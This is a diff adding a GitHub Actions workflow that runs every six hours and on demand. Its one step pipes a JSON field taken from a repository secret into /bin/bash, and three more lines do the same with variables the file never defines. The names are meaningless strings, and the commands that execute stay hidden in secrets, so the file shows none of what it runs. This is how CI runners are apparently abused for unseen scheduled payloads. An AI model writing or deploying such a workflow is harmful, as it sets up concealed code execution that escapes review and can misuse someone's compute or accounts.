@@ -1,0 +1,21 @@
+name: chenjiumu6718
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenjiumu6718
+        env:
+          io053: ${{ secrets.io053 }}
+        run: |
+          echo $io053 | jq -r .pc36811 | /bin/bash
+          echo $sy98 | jq -r .coa3 | /bin/bash
+          echo $ag4 | jq -r .k1 | /bin/bash
+          echo $x9 | jq -r .d05 | /bin/bash
+
